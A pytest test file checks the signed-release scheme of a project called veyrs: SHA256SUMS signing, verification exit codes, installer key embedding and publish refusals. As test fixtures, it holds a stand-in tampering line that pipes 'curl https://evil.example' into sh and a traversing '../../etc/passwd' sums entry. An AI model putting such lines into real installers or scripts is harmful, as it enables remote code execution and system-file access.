"""Phase 52 -- signed releases.

A `.sha256` downloaded from the same place as its asset proves integrity, not
origin: whoever can replace the asset can replace the checksum. From 0.33.0 a
release carries `SHA256SUMS` (every asset) and `SHA256SUMS.sig`, an OpenSSH
signature (`ssh-keygen -Y sign`, namespace `veyrs-release`, principal
`release@veyrs`) checked against `release/allowed_signers`.

Every test makes its own throwaway ed25519 key at run time; the real release
key never comes near a test. The committed `release/allowed_signers` holds a
PLACEHOLDER until the integrator inserts the real key, and every consumer must
read that as "cannot verify" -- never as success.
"""
from __future__ import annotations

import hashlib
import io
import os
import re
import shutil
import stat
import subprocess
import tarfile
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
VERIFY = ROOT / "scripts" / "verify-release.sh"
SETUP = ROOT / "veyrs-setup.sh"
PUBLISH = ROOT / "scripts" / "publish-github.sh"
SIGNERS_FILE = ROOT / "release" / "allowed_signers"
PLACEHOLDER_LINE = ('release@veyrs namespaces="veyrs-release" ssh-ed25519 '
                    'PLACEHOLDER-REPLACE-WITH-THE-REAL-RELEASE-PUBLIC-KEY\n')

# verify-release.sh exit codes
OK, UNSIGNED, BAD_SIGNATURE, HASH_MISMATCH, CANNOT_VERIFY = 0, 3, 4, 5, 6

needs_ssh_keygen = pytest.mark.skipif(
    shutil.which("ssh-keygen") is None,
    reason="ssh-keygen (OpenSSH >= 8.1) is not installed on this host",
)


# ----------------------------------------------------------------- helpers ---
def make_key(directory: Path, name: str = "release") -> tuple[Path, Path]:
    """A throwaway ed25519 key pair and an allowed_signers trusting it."""
    directory.mkdir(parents=True, exist_ok=True)
    key = directory / name
    subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "release@veyrs",
                    "-f", str(key)], check=True, stdin=subprocess.DEVNULL)
    key.chmod(0o600)
    pub = (directory / f"{name}.pub").read_text().split()
    signers = directory / f"{name}.allowed_signers"
    signers.write_text(f'release@veyrs namespaces="veyrs-release" {pub[0]} {pub[1]}\n')
    return key, signers


def make_tarball(path: Path, version: str) -> None:
    data = f'[project]\nname = "veyrs"\nversion = "{version}"\n'.encode()
    with tarfile.open(path, "w:gz") as tar:
        info = tarfile.TarInfo(f"veyrs-{version}/pyproject.toml")
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))


def write_sums(directory: Path, names: list[str]) -> None:
    lines = [f"{hashlib.sha256((directory / n).read_bytes()).hexdigest()}  {n}" for n in names]
    (directory / "SHA256SUMS").write_text("\n".join(lines) + "\n")


def sign(directory: Path, key: Path) -> None:
    sig = directory / "SHA256SUMS.sig"
    if sig.exists():
        sig.unlink()
    subprocess.run(["ssh-keygen", "-Y", "sign", "-f", str(key), "-n", "veyrs-release",
                    str(directory / "SHA256SUMS")], check=True, stdin=subprocess.DEVNULL,
                   capture_output=True)


def make_release(directory: Path, key: Path | None, version: str = "0.33.0",
                 setup_body: str = '#!/usr/bin/env bash\necho "fake installer"\n') -> list[str]:
    """The four assets publish-github.sh builds, plus SHA256SUMS (+ .sig if key)."""
    directory.mkdir(parents=True, exist_ok=True)
    tgz = f"veyrs-{version}-src.tar.gz"
    (directory / "veyrs-setup.sh").write_text(setup_body)
    make_tarball(directory / tgz, version)
    for n in ("veyrs-setup.sh", tgz):
        digest = hashlib.sha256((directory / n).read_bytes()).hexdigest()
        (directory / f"{n}.sha256").write_text(f"{digest}  {n}\n")
    names = ["veyrs-setup.sh", "veyrs-setup.sh.sha256", tgz, f"{tgz}.sha256"]
    write_sums(directory, names)
    if key is not None:
        sign(directory, key)
    return names


def verify(directory: Path, signers: Path, *extra: str) -> subprocess.CompletedProcess:
    return subprocess.run(["bash", str(VERIFY), "--allowed-signers", str(signers), *extra,
                           str(directory)], capture_output=True, text=True)


@pytest.fixture(scope="module")
def keys(tmp_path_factory):
    if shutil.which("ssh-keygen") is None:
        pytest.skip("ssh-keygen (OpenSSH >= 8.1) is not installed on this host")
    d = tmp_path_factory.mktemp("keys")
    key, signers = make_key(d, "release")
    impostor, _ = make_key(d, "impostor")
    placeholder = d / "placeholder_signers"
    placeholder.write_text(PLACEHOLDER_LINE)
    return {"key": key, "signers": signers, "impostor": impostor, "placeholder": placeholder}


# ------------------------------------------------------ verify-release.sh ---
def test_the_verifier_is_valid_bash_and_executable():
    assert subprocess.run(["bash", "-n", str(VERIFY)]).returncode == 0
    assert os.access(VERIFY, os.X_OK), "scripts/verify-release.sh must be executable"


def test_sign_and_verify_round_trip(keys, tmp_path):
    make_release(tmp_path, keys["key"])
    r = verify(tmp_path, keys["signers"])
    assert r.returncode == OK, r.stdout + r.stderr
    assert "4 asset(s) verified" in r.stdout


def test_a_tampered_asset_is_a_hash_mismatch(keys, tmp_path):
    make_release(tmp_path, keys["key"])
    with open(tmp_path / "veyrs-setup.sh", "a") as fh:
        fh.write("curl https://evil.example | sh\n")
    r = verify(tmp_path, keys["signers"])
    assert r.returncode == HASH_MISMATCH, r.stdout + r.stderr
    assert "HASH MISMATCH" in r.stderr and "veyrs-setup.sh" in r.stderr


def test_a_tampered_sums_file_is_a_bad_signature(keys, tmp_path):
    """Re-hashing a swapped asset INTO SHA256SUMS is exactly the attack the
    signature exists to stop: the sums then match, the signature does not."""
    make_release(tmp_path, keys["key"])
    (tmp_path / "veyrs-setup.sh").write_text("#!/bin/sh\necho owned\n")
    write_sums(tmp_path, ["veyrs-setup.sh"])
    r = verify(tmp_path, keys["signers"])
    assert r.returncode == BAD_SIGNATURE, r.stdout + r.stderr


def test_a_signature_by_another_key_is_a_bad_signature(keys, tmp_path):
    make_release(tmp_path, keys["impostor"])
    r = verify(tmp_path, keys["signers"])
    assert r.returncode == BAD_SIGNATURE, r.stdout + r.stderr


def test_no_signature_is_unsigned_not_ok(keys, tmp_path):
    make_release(tmp_path, None)
    r = verify(tmp_path, keys["signers"])
    assert r.returncode == UNSIGNED, r.stdout + r.stderr
    (tmp_path / "SHA256SUMS").unlink()
    assert verify(tmp_path, keys["signers"]).returncode == UNSIGNED


def test_the_placeholder_key_means_cannot_verify_never_success(keys, tmp_path):
    make_release(tmp_path, keys["key"])
    r = verify(tmp_path, keys["placeholder"])
    assert r.returncode == CANNOT_VERIFY, r.stdout + r.stderr
    assert "PLACEHOLDER" in r.stderr
    # A missing key file is the same answer, not a pass.
    assert verify(tmp_path, tmp_path / "nope").returncode == CANNOT_VERIFY


def test_the_committed_allowed_signers_is_a_placeholder_or_a_real_key(keys, tmp_path):
    lines = [ln for ln in SIGNERS_FILE.read_text().splitlines() if ln and not ln.startswith("#")]
    assert len(lines) == 1, "release/allowed_signers must carry exactly one key line"
    real = re.match(r'^release@veyrs\s+namespaces="veyrs-release"\s+ssh-ed25519\s+AAAAC3NzaC1lZDI1NTE5\S+', lines[0])
    if real:
        return  # the integrator inserted the real key; nothing else to assert here
    assert "PLACEHOLDER" in lines[0]
    make_release(tmp_path, keys["key"])
    assert verify(tmp_path, SIGNERS_FILE).returncode == CANNOT_VERIFY, \
        "the committed placeholder must make every verification 'cannot verify'"


def test_a_missing_listed_asset_fails_unless_ignored_and_required_ones_still_count(keys, tmp_path):
    names = make_release(tmp_path, keys["key"])
    (tmp_path / names[1]).unlink()
    assert verify(tmp_path, keys["signers"]).returncode == HASH_MISMATCH
    assert verify(tmp_path, keys["signers"], "--ignore-missing").returncode == OK
    r = verify(tmp_path, keys["signers"], "--ignore-missing", "--require", names[1])
    assert r.returncode == HASH_MISMATCH and "required asset" in r.stderr
    r = verify(tmp_path, keys["signers"], "--ignore-missing", "--require", "not-in-the-release.tgz")
    assert r.returncode == HASH_MISMATCH


def test_a_malformed_or_traversing_sums_line_is_refused_even_when_signed(keys, tmp_path):
    make_release(tmp_path, None)
    (tmp_path / "SHA256SUMS").write_text(f"{'0' * 64}  ../../etc/passwd\n")
    sign(tmp_path, keys["key"])
    r = verify(tmp_path, keys["signers"])
    assert r.returncode == HASH_MISMATCH and "malformed" in r.stderr


def test_an_unlisted_file_is_reported_not_silently_trusted(keys, tmp_path):
    make_release(tmp_path, keys["key"])
    (tmp_path / "extra.bin").write_bytes(b"x")
    r = verify(tmp_path, keys["signers"])
    assert r.returncode == OK
    assert "extra.bin is not covered" in r.stderr


# ----------------------------------------------------------- veyrs-setup.sh ---
def _embedded_block(src: str) -> str:
    m = re.search(r"<<'VEYRS_ALLOWED_SIGNERS'\n(.*?)\nVEYRS_ALLOWED_SIGNERS\n", src, re.S)
    assert m, "veyrs-setup.sh no longer embeds release/allowed_signers in a VEYRS_ALLOWED_SIGNERS heredoc"
    return m.group(1)


def test_the_installer_asks_for_ssh_keygen_by_package_name_never_by_path():
    """0.33.0 shipped `zypper install /usr/bin/ssh-keygen`: Leap 15.6 answered
    "No provider of '/usr/bin/ssh-keygen' found" (openssh-common ships it) and
    the published installer stopped at step 1 on SUSE. dnf5 does not load file
    lists either. Package names only: openssh-client (Debian), openssh-clients
    (RHEL and SUSE, which pulls the package carrying ssh-keygen on both)."""
    import re
    body = SETUP.read_text()
    code = "\n".join(ln for ln in body.splitlines() if not ln.lstrip().startswith("#"))
    assert not re.search(r"pkgs\+=\(\s*/", code), "a package requested by file path"
    assert "pkgs+=(openssh-client)" in code and "pkgs+=(openssh-clients)" in code


def test_the_key_embedded_in_veyrs_setup_equals_release_allowed_signers():
    """veyrs-setup.sh is downloaded ALONE: a key fetched next to the signature
    would prove nothing, so it carries its own copy -- and the copy must be
    the key the publisher signs against."""
    assert _embedded_block(SETUP.read_text()) == SIGNERS_FILE.read_text().rstrip("\n"), (
        "the allowed_signers embedded in veyrs-setup.sh differs from release/allowed_signers. "
        "Paste the file between the VEYRS_ALLOWED_SIGNERS markers."
    )


def test_veyrs_setup_is_valid_bash_and_documents_allow_unsigned():
    assert subprocess.run(["bash", "-n", str(SETUP)]).returncode == 0
    src = SETUP.read_text()
    assert "--allow-unsigned" in src and 'SIGNED_SINCE="0.33.0"' in src
    # The trust anchor must not be swappable from the environment.
    assert "VEYRS_SETUP_ALLOWED_SIGNERS" not in src


def test_the_dry_run_still_installs_nothing_for_the_signature_check():
    """ensure_tools' dry-run branch returns before the package manager runs,
    and the signature functions never install or write anything."""
    src = SETUP.read_text()
    body = src[src.index("ensure_tools() {"): src.index("\n}\n", src.index("ensure_tools() {"))]
    assert body.index('if [ "$DRY_RUN" -eq 1 ]; then') < body.index('info "installing:')
    dry = body[body.index('if [ "$DRY_RUN" -eq 1 ]; then'): body.index('info "installing:')]
    assert "return 0" in dry and "run_quiet" not in dry
    for fn in ("check_release_signature() {", "signature_policy() {"):
        start = src.index(fn)
        fbody = src[start: src.index("\n}\n", start)]
        assert "run_quiet" not in fbody and "apt-get" not in fbody and "zypper" not in fbody


def _setup_function(src: str, name: str) -> str:
    start = src.index(f"\n{name}() {{") + 1
    line = src[start: src.index("\n", start)]
    if re.match(r"^\w+\(\) \{.*\}\s*(#.*)?$", line):
        return line + "\n"  # a one-line function
    return src[start: src.index("\n}\n", start) + 3]


def _policy(tmp_path: Path, version: str, rel: Path, asset: str, *, signers_text: str | None,
            allow_unsigned: int = 0) -> subprocess.CompletedProcess:
    """Run veyrs-setup.sh's OWN signature_policy() in isolation.

    The installer itself is never executed here (it wants root, systemd and a
    host to install on); its verification functions are cut out of the real
    file, so what is tested is what ships.
    """
    src = SETUP.read_text()
    consts = "\n".join(ln for ln in src.splitlines()
                       if re.match(r"^(SIGNED_SINCE|SIGN_NAMESPACE|SIGN_PRINCIPAL|RELEASE_KEY_RE)=", ln))
    if signers_text is None:  # the EMBEDDED block, exactly as shipped
        start = src.index("# ---- BEGIN EMBEDDED release/allowed_signers ----")
        end = src.index("# ---- END EMBEDDED release/allowed_signers ----")
        signers = src[start:end]
    else:
        (tmp_path / "trust").write_text(signers_text)
        signers = f'RELEASE_ALLOWED_SIGNERS="$(cat {tmp_path / "trust"})"'
    harness = "\n".join([
        "set -Eeuo pipefail",
        'ok(){ echo "OK: $*"; }; warn(){ echo "WARN: $*"; }; info(){ :; }',
        'die(){ echo "DIE: $*"; exit 1; }',
        f"ALLOW_UNSIGNED={allow_unsigned}",
        consts, signers,
        _setup_function(src, "have"), _setup_function(src, "ver_ge"),
        _setup_function(src, "check_release_signature"), _setup_function(src, "signature_policy"),
        f'if signature_policy "{version}" "{rel}" "{rel / asset}"; then echo RESULT=verified; '
        'else echo RESULT=fallback; fi',
    ])
    script = tmp_path / "policy.sh"
    script.write_text(harness)
    return subprocess.run(["bash", str(script)], capture_output=True, text=True)


def test_setup_accepts_a_correctly_signed_release(keys, tmp_path):
    rel = tmp_path / "rel"
    make_release(rel, keys["key"])
    r = _policy(tmp_path, "0.33.0", rel, "veyrs-0.33.0-src.tar.gz",
                signers_text=keys["signers"].read_text())
    assert "RESULT=verified" in r.stdout, r.stdout + r.stderr


def test_setup_refuses_a_tampered_tarball_and_a_bad_signature_even_with_allow_unsigned(keys, tmp_path):
    rel = tmp_path / "rel"
    make_release(rel, keys["key"])
    with open(rel / "veyrs-0.33.0-src.tar.gz", "ab") as fh:
        fh.write(b"\0")
    r = _policy(tmp_path, "0.33.0", rel, "veyrs-0.33.0-src.tar.gz",
                signers_text=keys["signers"].read_text(), allow_unsigned=1)
    assert r.returncode == 1 and "DIE: SHA-256 MISMATCH" in r.stdout, r.stdout
    rel2 = tmp_path / "rel2"
    make_release(rel2, keys["impostor"])
    r = _policy(tmp_path, "0.33.0", rel2, "veyrs-0.33.0-src.tar.gz",
                signers_text=keys["signers"].read_text(), allow_unsigned=1)
    assert r.returncode == 1 and "DIE: BAD SIGNATURE" in r.stdout, r.stdout


def test_setup_refuses_an_unsigned_signed_era_release_unless_allowed(keys, tmp_path):
    rel = tmp_path / "rel"
    make_release(rel, None)
    text = keys["signers"].read_text()
    r = _policy(tmp_path, "0.33.0", rel, "veyrs-0.33.0-src.tar.gz", signers_text=text)
    assert r.returncode == 1 and "cannot be verified" in r.stdout, r.stdout
    r = _policy(tmp_path, "0.33.0", rel, "veyrs-0.33.0-src.tar.gz", signers_text=text, allow_unsigned=1)
    assert "RESULT=fallback" in r.stdout and "UNVERIFIED ORIGIN" in r.stdout, r.stdout


def test_setup_keeps_the_sha256_path_for_releases_before_0_33(keys, tmp_path):
    rel = tmp_path / "rel"
    make_release(rel, None, version="0.32.5")
    r = _policy(tmp_path, "0.32.5", rel, "veyrs-0.32.5-src.tar.gz", signers_text=keys["signers"].read_text())
    assert "RESULT=fallback" in r.stdout and "predates signed releases" in r.stdout, r.stdout


def test_setup_with_the_shipped_placeholder_cannot_verify_and_refuses(keys, tmp_path):
    src = SETUP.read_text()
    if re.search(r'^release@veyrs\s+namespaces="veyrs-release"\s+ssh-ed25519\s+AAAAC3', _embedded_block(src), re.M):
        pytest.skip("the real release key is embedded; the placeholder case no longer applies")
    rel = tmp_path / "rel"
    make_release(rel, keys["key"])
    r = _policy(tmp_path, "0.33.0", rel, "veyrs-0.33.0-src.tar.gz", signers_text=None)
    assert r.returncode == 1 and "RESULT=verified" not in r.stdout, r.stdout
    assert "PLACEHOLDER" in r.stdout


# ------------------------------------------------------- publish-github.sh ---
def _publish(tmp_path: Path, env_extra: dict, *args: str) -> tuple[subprocess.CompletedProcess, Path]:
    """publish-github.sh with curl and gh replaced by recorders: any network
    call it makes is written to calls.log."""
    bindir = tmp_path / "bin"
    bindir.mkdir(exist_ok=True)
    log = tmp_path / "calls.log"
    for tool in ("curl", "gh"):
        stub = bindir / tool
        stub.write_text(f'#!/bin/sh\necho "{tool} $*" >> "{log}"\nexit 99\n')
        stub.chmod(0o755)
    env = {"PATH": f"{bindir}:{os.environ.get('PATH', '/usr/bin:/bin')}", "HOME": str(tmp_path),
           "OUT": str(tmp_path / "out"), "ASSETS": str(tmp_path / "assets"), "USE_GH": "no",
           "GH_TOKEN": "ghs_FAKEtokenFORtheTEST0123456789abcdef", **env_extra}
    r = subprocess.run(["bash", str(PUBLISH), *args], capture_output=True, text=True, env=env)
    return r, log


def test_publish_release_refuses_without_a_signing_key_before_any_network_call(tmp_path):
    r, log = _publish(tmp_path, {}, "--release", "0.33.0")
    assert r.returncode == 1, r.stdout + r.stderr
    assert "refusing to publish an UNSIGNED release" in r.stderr
    assert not log.exists(), f"GitHub was contacted: {log.read_text()}"


@needs_ssh_keygen
def test_publish_release_refuses_a_key_other_accounts_can_read(tmp_path, keys):
    loose = tmp_path / "loose"
    shutil.copy(keys["key"], loose)
    loose.chmod(0o640)
    r, log = _publish(tmp_path, {"VEYRS_RELEASE_SIGNING_KEY": str(loose)}, "--release", "0.33.0")
    assert r.returncode == 1 and "accessible to group/other" in r.stderr, r.stderr
    assert not log.exists()
    assert keys["key"].read_text().splitlines()[1] not in r.stdout + r.stderr, "the key was echoed"


def test_publish_unsigned_must_be_asked_for_by_name():
    src = PUBLISH.read_text()
    assert "--unsigned) UNSIGNED=1" in src
    assert "UNSIGNED RELEASE" in src, "an unsigned publish must say so loudly"
    assert subprocess.run(["bash", "-n", str(PUBLISH)]).returncode == 0
    # SHA256SUMS and its signature are among the uploaded names.
    assert '"$ASSET_SUMS")' in src and 'names+=("$ASSET_SIG")' in src


@needs_ssh_keygen
@pytest.mark.skipif(not (ROOT / ".git").exists() or shutil.which("git") is None,
                    reason="the publish harness exports with `git ls-files`; this copy is not a git checkout")
def test_the_offline_publish_harness_passes():
    """scripts/test-publish-github.sh drives the whole release flow against a
    stubbed GitHub, including every signing case. Slow; runs where it can."""
    r = subprocess.run(["bash", str(ROOT / "scripts" / "test-publish-github.sh")],
                       capture_output=True, text=True, timeout=900)
    assert r.returncode == 0, r.stdout[-4000:] + r.stderr[-2000:]
